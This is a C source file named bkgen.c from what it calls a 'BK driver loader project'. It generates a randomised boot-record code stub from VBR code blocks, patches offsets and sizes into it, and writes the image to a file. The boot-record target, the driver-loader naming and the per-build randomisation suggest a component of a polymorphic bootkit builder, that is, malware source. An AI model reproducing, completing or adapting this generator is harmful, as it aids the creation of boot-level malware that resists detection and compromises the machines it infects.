//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BK driver loader project. Version 2.
//	
// module: bkgen.c
// description: 
//	BK code stub generator.

#include "main.h"
#include "bme.h"
#include "i386\variables.h"


extern	CODE_BLOCK	g_VBS_blocks;
extern	CODE_BLOCK	g_VBR_blocks;


BOOL	WriteToFile(
				LPTSTR	Name,
				PCHAR	Data,
				ULONG	bSize
				)
{
	BOOL	Ret = FALSE;
	HANDLE	hFile;
	ULONG	bWritten;

	hFile = CreateFile(Name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		if (WriteFile(hFile, Data, bSize, &bWritten, NULL) && (bWritten == bSize))
			Ret = TRUE;
		CloseHandle(hFile);
	}
	return(Ret);
}


int _tmain(int argc, _TCHAR* argv[])
{
	MIXED_CODE	VBSCode = {0};
	MIXED_CODE	VBRCode = {0};
	PCONST_DESCRIPTOR Constants = (PCONST_DESCRIPTOR)Alloc(sizeof(CONST_DESCRIPTOR) * var_max);

	srand(GetTickCount());

	if (BmeCreateMixedCode(&VBRCode, &g_VBR_blocks, rand(), MCF_ENTRY_AT_BEGIN))
	{
		Constants[(var_offset_core & CONST_INDEX_MASK)].Value = VBRCode.CoreOffset - VBRCode.EntrySize;
		Constants[(var_offset_table & CONST_INDEX_MASK)].Value = VBRCode.TableOffset;
		Constants[(var_index_base & CONST_INDEX_MASK)].Value = VBRCode.IndexBase;
		Constants[(var_block0_ofs & CONST_INDEX_MASK)].Value = VBRCode.Block0Offset;
		Constants[(var_packed_ldr & CONST_INDEX_MASK)].Value = VBRCode.Size - VBRCode.CoreOffset;
		Constants[(var_code_size & CONST_INDEX_MASK)].Value = VBRCode.Size - VBRCode.EntrySize;
		Constants[(var_entry_size & CONST_INDEX_MASK)].Value = VBRCode.EntrySize;

		BmeConstants(&VBRCode, Constants);

		DeleteFile(argv[1]);
		WriteToFile(argv[1], VBRCode.Image, VBRCode.Size);
	}	// if (BmeCreateMixedCode(&VBRCode, &g_VBR_blocks, rand32(), MCF_ENTRY_AT_BEGIN))

	return(NO_ERROR);
}

